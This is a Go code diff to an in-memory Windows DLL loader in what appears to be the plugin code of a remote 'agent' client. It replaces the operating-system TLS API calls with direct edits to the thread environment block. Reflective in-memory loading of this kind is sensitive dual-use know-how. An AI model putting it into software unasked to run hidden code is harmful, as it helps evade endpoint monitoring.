@@ -5,6 +5,7 @@ package plugins
 import (
 	"errors"
 	"fmt"
+	"overlord-client/cmd/agent/plugins/teb"
 	"syscall"
 	"unsafe"
 
@@ -123,14 +124,18 @@ type imageTLSDirectory64 struct {
 }
 
 type MemoryModule struct {
-	base        uintptr
-	size        uintptr
-	entryPoint  uintptr
-	exports     map[string]uintptr
-	importDLLs  []windows.Handle
-	initialized bool
-	tlsIndex    uint32
-	tlsData     uintptr
+	base          uintptr
+	size          uintptr
+	entryPoint    uintptr
+	exports       map[string]uintptr
+	importDLLs    []windows.Handle
+	initialized   bool
+	tlsIndex      uint32
+	tlsData       uintptr
+	tlsArrayAlloc uintptr // our VirtualAlloc'd ThreadLocalStoragePointer array
+	tlsTemplSrc   uintptr // PE template raw data start (for copying to new threads)
+	tlsTemplSize  uintptr // dataSize (template bytes to copy)
+	tlsTotalSize  uintptr // dataSize + zeroFill (total allocation per thread)
 }
 
 func LoadMemoryModule(data []byte) (*MemoryModule, error) {
@@ -293,8 +298,8 @@ func (mm *MemoryModule) Free() {
 	if mm.tlsIndex != 0xFFFFFFFF {
 		if mm.tlsData != 0 {
 			_ = windows.VirtualFree(mm.tlsData, 0, windows.MEM_RELEASE)
+			mm.tlsData = 0
 		}
-		procTlsFree.Call(uintptr(mm.tlsIndex))
 	}
 	for _, h := range mm.importDLLs {
 		_ = windows.FreeLibrary(h)
@@ -431,29 +436,77 @@ func (mm *MemoryModule) setupTLS(reason uint32) {
 
 	tls := (*imageTLSDirectory64)(unsafe.Pointer(mm.base + uintptr(tlsDir.VirtualAddress)))
 
-	idx, _, _ := procTlsAlloc.Call()
-	if idx == 0xFFFFFFFF {
-		return
-	}
-	mm.tlsIndex = uint32(idx)
-
-	if tls.AddressOfIndex != 0 {
-		*(*uint32)(unsafe.Pointer(uintptr(tls.AddressOfIndex))) = mm.tlsIndex
-	}
-
 	dataSize := uintptr(tls.EndAddressOfRawData - tls.StartAddressOfRawData)
 	totalSize := dataSize + uintptr(tls.SizeOfZeroFill)
+
+	var tlsData uintptr
 	if totalSize > 0 {
-		tlsData, err := windows.VirtualAlloc(0, totalSize,
+		var err error
+		tlsData, err = windows.VirtualAlloc(0, totalSize,
 			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
-		if err == nil && tlsData != 0 {
-			if dataSize > 0 {
-				copyMem(tlsData, (*byte)(unsafe.Pointer(uintptr(tls.StartAddressOfRawData))), dataSize)
-			}
-			procTlsSetValue.Call(uintptr(mm.tlsIndex), tlsData)
-			mm.tlsData = tlsData
+		if err != nil || tlsData == 0 {
+			return
+		}
+		if dataSize > 0 {
+			copyMem(tlsData, (*byte)(unsafe.Pointer(uintptr(tls.StartAddressOfRawData))), dataSize)
 		}
 	}
+
+	tebAddr := teb.CurrentTEB()
+	tlsArrayField := (*uintptr)(unsafe.Pointer(tebAddr + 0x58)) // ThreadLocalStoragePointer
+	oldArray := *tlsArrayField
+
+	var newIndex uint32
+	ptrSize := unsafe.Sizeof(uintptr(0))
+
+	if oldArray == 0 {
+		newArray, err := windows.VirtualAlloc(0, ptrSize,
+			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+		if err != nil || newArray == 0 {
+			if tlsData != 0 {
+				_ = windows.VirtualFree(tlsData, 0, windows.MEM_RELEASE)
+			}
+			return
+		}
+		*(*uintptr)(unsafe.Pointer(newArray)) = tlsData
+		*tlsArrayField = newArray
+		newIndex = 0
+		mm.tlsArrayAlloc = newArray
+	} else {
+		var count uint32
+		for count = 0; count < 256; count++ {
+			entry := *(*uintptr)(unsafe.Pointer(oldArray + uintptr(count)*ptrSize))
+			if entry == 0 {
+				break
+			}
+		}
+		newSize := uintptr(count+1) * ptrSize
+		newArray, err := windows.VirtualAlloc(0, newSize,
+			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+		if err != nil || newArray == 0 {
+			if tlsData != 0 {
+				_ = windows.VirtualFree(tlsData, 0, windows.MEM_RELEASE)
+			}
+			return
+		}
+		if count > 0 {
+			copyMem(newArray, (*byte)(unsafe.Pointer(oldArray)), uintptr(count)*ptrSize)
+		}
+		*(*uintptr)(unsafe.Pointer(newArray + uintptr(count)*ptrSize)) = tlsData
+		*tlsArrayField = newArray
+		newIndex = count
+		mm.tlsArrayAlloc = newArray
+	}
+
+	if tls.AddressOfIndex != 0 {
+		*(*uint32)(unsafe.Pointer(uintptr(tls.AddressOfIndex))) = newIndex
+	}
+
+	mm.tlsIndex = newIndex
+	mm.tlsData = tlsData
+	mm.tlsTemplSrc = uintptr(tls.StartAddressOfRawData)
+	mm.tlsTemplSize = dataSize
+	mm.tlsTotalSize = totalSize
 
 	if tls.AddressOfCallBacks != 0 {
 		cbAddr := uintptr(tls.AddressOfCallBacks)
@@ -465,6 +518,61 @@ func (mm *MemoryModule) setupTLS(reason uint32) {
 			syscall.SyscallN(cb, mm.base, uintptr(reason), 0)
 			cbAddr += 8
 		}
+	}
+}
+
+func (mm *MemoryModule) SetupThreadTLS() func() {
+	if mm.tlsIndex == 0xFFFFFFFF || mm.tlsTotalSize == 0 {
+		return func() {}
+	}
+
+	tlsData, err := windows.VirtualAlloc(0, mm.tlsTotalSize,
+		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+	if err != nil || tlsData == 0 {
+		return func() {}
+	}
+	if mm.tlsTemplSize > 0 {
+		copyMem(tlsData, (*byte)(unsafe.Pointer(mm.tlsTemplSrc)), mm.tlsTemplSize)
+	}
+
+	ptrSize := unsafe.Sizeof(uintptr(0))
+	tebAddr := teb.CurrentTEB()
+	tlsArrayField := (*uintptr)(unsafe.Pointer(tebAddr + 0x58))
+	oldArray := *tlsArrayField
+
+	var newArray uintptr
+	if oldArray == 0 {
+		arrSize := uintptr(mm.tlsIndex+1) * ptrSize
+		newArray, err = windows.VirtualAlloc(0, arrSize,
+			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+		if err != nil || newArray == 0 {
+			_ = windows.VirtualFree(tlsData, 0, windows.MEM_RELEASE)
+			return func() {}
+		}
+		*(*uintptr)(unsafe.Pointer(newArray + uintptr(mm.tlsIndex)*ptrSize)) = tlsData
+		*tlsArrayField = newArray
+	} else {
+		needed := uintptr(mm.tlsIndex+1) * ptrSize
+		newArray, err = windows.VirtualAlloc(0, needed,
+			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+		if err != nil || newArray == 0 {
+			_ = windows.VirtualFree(tlsData, 0, windows.MEM_RELEASE)
+			return func() {}
+		}
+		copyMem(newArray, (*byte)(unsafe.Pointer(oldArray)), needed)
+		*(*uintptr)(unsafe.Pointer(newArray + uintptr(mm.tlsIndex)*ptrSize)) = tlsData
+		*tlsArrayField = newArray
+	}
+
+	return func() {
+		_ = windows.VirtualFree(tlsData, 0, windows.MEM_RELEASE)
+		if newArray != 0 {
+			*(*uintptr)(unsafe.Pointer(newArray + uintptr(mm.tlsIndex)*ptrSize)) = 0
+			_ = windows.VirtualFree(newArray, 0, windows.MEM_RELEASE)
+		}
+		tebNow := teb.CurrentTEB()
+		field := (*uintptr)(unsafe.Pointer(tebNow + 0x58))
+		*field = oldArray
 	}
 }
 
@@ -480,45 +588,42 @@ func peString(addr uintptr) string {
 	return string(buf)
 }
 
-var (
-	modKernel32     = windows.NewLazySystemDLL("kernel32.dll")
-	procGetProcAddr = modKernel32.NewProc("GetProcAddress")
-	procTlsAlloc    = modKernel32.NewProc("TlsAlloc")
-	procTlsSetValue = modKernel32.NewProc("TlsSetValue")
-	procTlsFree     = modKernel32.NewProc("TlsFree")
-)
-
-func getProcByOrdinal(module windows.Handle, ordinal uint16) (uintptr, error) {
-	r, _, err := procGetProcAddr.Call(uintptr(module), uintptr(ordinal))
-	if r == 0 {
-		return 0, fmt.Errorf("GetProcAddress ordinal %d: %w", ordinal, err)
+func copyMem(dst uintptr, src *byte, size uintptr) {
+	for i := uintptr(0); i < size; i++ {
+		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(src)) + i))
 	}
-	return r, nil
 }
 
 func sectionProtection(chars uint32) uint32 {
-	exec := chars&imageSCNMemExecute != 0
-	read := chars&imageSCNMemRead != 0
-	write := chars&imageSCNMemWrite != 0
+	r := chars&imageSCNMemRead != 0
+	w := chars&imageSCNMemWrite != 0
+	x := chars&imageSCNMemExecute != 0
 
 	switch {
-	case exec && write:
+	case x && w:
 		return windows.PAGE_EXECUTE_READWRITE
-	case exec && read:
+	case x && r:
 		return windows.PAGE_EXECUTE_READ
-	case exec:
+	case x:
 		return windows.PAGE_EXECUTE
-	case write:
+	case w:
 		return windows.PAGE_READWRITE
-	case read:
+	case r:
 		return windows.PAGE_READONLY
 	default:
 		return windows.PAGE_NOACCESS
 	}
 }
 
-func copyMem(dst uintptr, src *byte, size uintptr) {
-	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), size)
-	srcSlice := unsafe.Slice(src, size)
-	copy(dstSlice, srcSlice)
+var (
+	modKernel32     = windows.NewLazySystemDLL("kernel32.dll")
+	procGetProcAddr = modKernel32.NewProc("GetProcAddress")
+)
+
+func getProcByOrdinal(module windows.Handle, ordinal uint16) (uintptr, error) {
+	r, _, err := procGetProcAddr.Call(uintptr(module), uintptr(ordinal))
+	if r == 0 {
+		return 0, fmt.Errorf("pe: GetProcAddress ordinal %d: %w", ordinal, err)
+	}
+	return r, nil
 }
